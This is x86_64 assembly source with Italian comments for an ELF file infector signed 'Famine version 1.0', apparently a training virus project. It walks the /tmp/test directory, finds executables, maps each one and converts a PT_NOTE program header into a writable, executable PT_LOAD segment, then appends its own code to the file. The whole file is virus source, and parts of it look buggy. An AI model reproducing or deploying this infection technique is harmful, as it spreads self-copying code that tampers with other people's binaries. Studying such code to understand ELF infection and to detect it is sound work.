; +--------+------------+--------+------+------+------+------+------+------+
; |  arch  | syscall NR | return | arg0 | arg1 | arg2 | arg3 | arg4 | arg5 |
; +--------+------------+--------+------+------+------+------+------+------+
; | x86    | eax        | eax    | ebx  | ecx  | edx  | esi  | edi  | ebp  |
; | x86_64 | rax        | rax    | rdi  | rsi  | rdx  | r10  | r8   | r9   |
; +--------+------------+--------+------+------+------+------+------+------+

; .-----------.-------.
; |   Stack   | bytes |
; :-----------+-------:
; | stat      |  4096 |
; :-----------+-------:
; | tot letto |     8 |
; :-----------+-------:
; | getdents  | 32768 |
; :-----------+-------:
; | fd dir    |     8 |
; :-----------+-------:
; | str dir2  |    16 |
; :-----------+-------:
; | str dir1  |    16 |
; '-----------'-------'

section .text
    global _start

_start:

    struc dirent
        .d_ino resb 8
        .d_off resb 8
        .d_reclen resb 2
        .d_type resb 1
        .d_name resb 8
    endstruc

    struc ehdr
        .e_ident        resb 16       ;    /* File identification. */
        .e_type         resb 2        ;    /* File type. */
        .e_machine      resb 2        ;    /* Machine architecture. */
        .e_version      resb 4        ;    /* ELF format version. */
        .e_entry        resb 8        ;    /* Entry point. */
        .e_phoff        resb 8        ;    /* Program header file offset. */
        .e_shoff        resb 8        ;    /* Section header file offset. */
        .e_flags        resb 4        ;    /* Architecture-specific flags. */
        .e_ehsize       resb 2        ;    /* Size of ELF header in bytes. */
        .e_phentsize    resb 2        ;    /* Size of program header entry. */
        .e_phnum        resb 2        ;    /* Number of program header entries. */
        .e_shentsize    resb 2        ;    /* Size of section header entry. */
        .e_shnum        resb 2        ;    /* Number of section header entries. */
        .e_shstrndx     resb 2        ;    /* Section name strings section. */
    endstruc

    struc phdr
        .p_type         resb 4        ;    /* Entry type. */
        .p_flags        resb 4        ;    /* Access permission flags. */
        .p_offset       resb 8        ;    /* File offset of contents. */
        .p_vaddr        resb 8        ;    /* Virtual address in memory image. */
        .p_paddr        resb 8        ;    /* Physical address (not used). */
        .p_filesz       resb 8        ;    /* Size of contents in file. */
        .p_memsz        resb 8        ;    /* Size of contents in memory. */
        .p_align        resb 8        ;    /* Alignment in memory and file. */
    endstruc

    mov rbp, rsp                      ; salvo stato attuale stack
    sub rsp, 16                       ; riservo spazio per /tmp/test
    mov dword [rsp+8], `t/\0\0`
    mov dword [rsp+4], '/tes'
    mov dword [rsp], '/tmp'

    sub rsp, 16                       ; riservo spazio per /tmp/test2
    mov dword [rsp+8], `t2/\0`
    mov dword [rsp+4], '/tes'
    mov dword [rsp], '/tmp'

    mov rdi, rsp
    add rdi, 16                       ; passo come argomento /tmp/test/
    call chdir

    mov rdi, rsp
    add rdi, 16                       ; passo come argomento /tmp/test/
    mov rsi, 0
    call open
    test rax, rax
    js exit
    push rax                          ; salvo nello stack fd cartella

    sub rsp, 32768                    ; riservo spazio nello stack per lettura getdents64
    mov rdi, rsp                      ; passo come argomento lo spazio riservato
    call getdents64
    push rax                          ; salvo nello stack totale letto da getdents64

    mov rdi, [rsp+32768+8]
    call closefd                      ; chiudo fd cartella

    sub rsp, 4096                     ; riservo spazio per stat
    mov r10, rsp                      ; r10 = puntatore stat
    mov rdi, rsp
    add rdi, 4104                     ; rdi = puntatore struct
    call loop_indir

;-----------------------------DEBUG-----------------------------
    mov rdi, 1
    mov rsi, rsp
    add rsi, 4096
    add rsi, 8
    add rsi, 32768
    add rsi, 8
    mov rdx, 11
    mov rax, 1
    syscall

    mov rdi, 1
    mov rsi, rsp
    add rsi, 4096
    add rsi, 8
    add rsi, 32768
    add rsi, 8
    add rsi, 16
    mov rdx, 10
    mov rax, 1
    syscall
;---------------------------------------------------------------

exit:
    mov rsp, rbp                      ; ripristino lo stack
    mov rdi, 0                        ; error code
    mov rax, 60
    syscall

open:                                 ; rdi = fd, rsi = permessi
    mov rdx, 0                        ; flag
    mov rax, 2
    syscall
    ret

getdents64:
    mov rsi, rdi                      ; struct linux_dirent64 *dirent
    mov rdi, [rsp+32768+8]            ; fd
    mov rdx, 32768                    ; quantità da leggere
    mov rax, 217
    syscall
    ret

closefd:                              ; rdi = fd
    mov rax, 3
    syscall
    ret

loop_indir:                           ; rdi = ptr struct, r10 = puntatore buffer
    mov rax, [rsp+4096+8]             ; rax = tot letto
    .loop:
        mov rsi, [rdi+dirent.d_name]  ; ptr + d_name
        cmp esi, 0x002e2e             ; controllo se si tratta di '..'
        je .continue
        cmp si, 0x002e                ; controllo se si tratta di '.'
        je .continue

    .check:
        push rax
        push rdi
        push rsi
        push rdx
        push r10
        mov rdi, rdi
        add rdi, dirent.d_name        ; rdi = ptr nome file
        mov rsi, r10
        mov rax, 4
        syscall
        xor rax, rax
        mov rcx, [rsi+24]             ; rcx = st_mode
        mov si, 1                     ; rsi = 1
        test rcx, 1b                  ; verifico la flag se è eseguibile
        cmove ax, si                  ; ax == 0 è eseguibile
        cmp ax, 0
        jne .restore

        .infect:
            call infect_file          ; rdi = ptr nome file
            pop r10
            pop rdx
            pop rsi
            pop rdi
            pop rax
            jmp .continue

        .restore:
            pop r10
            pop rdx
            pop rsi
            pop rdi
            pop rax
    .continue:
        mov dx, [rdi+dirent.d_reclen]
        add rdi, rdx
        sub rax, rdx
        cmp rax, 0
        je .end
        jmp .loop
    .end:
        ret

chdir:
    mov rax, 80
    syscall
    ret

lseek:                                ; rdi = fd
    xor rsi, rsi
    mov rdx, 2
    mov rax, 8
    syscall
    ret

mmap:                                 ; rsi = size, r8 = fd
    xor rdi, rdi
    mov rdx, 3
    mov r10, 1
    xor r9, r9
    mov rax, 9
    syscall
    ret

infect_file:                          ; rdi = ptr nome file
; open
    mov rsi, 1026
    call open                         ; rax = fd
    cmp rax, 0
    jb exit
    mov [rsp+36920], rax
; lseek
    push rax
    push rdi
    mov rdi, rax
    call lseek
    mov rsi, rax                      ; rsi = size file
    pop rdi
    pop rax
; mmap
    mov r8, rax
    push rax
    call mmap
    cmp rax, 0
    jb exit
    mov r10, rax                      ; r10 = ptr map
    pop rax
; infect
    mov rcx, [r10+ehdr.e_phoff]
    add rcx, r10                      ; rcx = phdr
    xor r12, r12
    mov r12w, [r10+ehdr.e_phnum]      ; r12 = phnum
    mov rax, -1
    .loop:
        inc rax
        mov dl, [rcx+phdr.p_type]
        cmp dl, 4                     ; p_type == PT_NOTE
        je .finded
        add rcx, 56
        cmp rax, r12
        jb .loop
    .end:
; close
    mov rdi, [rsp+36920]
    call closefd
; ret
    ret

    .finded:                          ; rcx = ptr section PT_NOTE
    mov dword [rcx+phdr.p_type], 1    ; PT_LOAD
    mov dword [rcx+phdr.p_flags], 7   ; PF_R | PF_X | PF_W
    lea r12, [rel end_offset]
    lea rax, [rel _start]
    sub r12, rax                      ; r12 = size payload
    mov qword [rcx+phdr.p_offset], rsi; p_offset = size file
    add rsi, 0xc000000                ; rsi = 0xc000000 + size file
    mov qword [rcx+phdr.p_vaddr], rsi ; p_vaddr = rsi
    add qword [rcx+phdr.p_filesz], r12; p_filesz += size payload
    add qword [rcx+phdr.p_memsz], r12 ; p_memsz += size payload
    xor rcx, rcx
    mov ecx, dword [r10+ehdr.e_entry] ; ecx = e_entry
    sub ecx, esi                      ; ecx -= p_vaddr
    sub ecx, r12d                     ; ecx -= size payload
    ; ecx = (uint32_t)offsetJump
; write
    mov rdi, [rsp+36920]
    lea rsi, [rel _start]
    mov rdx, r12
    mov rax, 1
    syscall
    jmp .end

firma:
	db 'Famine version 1.0 (c)oded by usavoia-usavoia', 0x00

end_offset: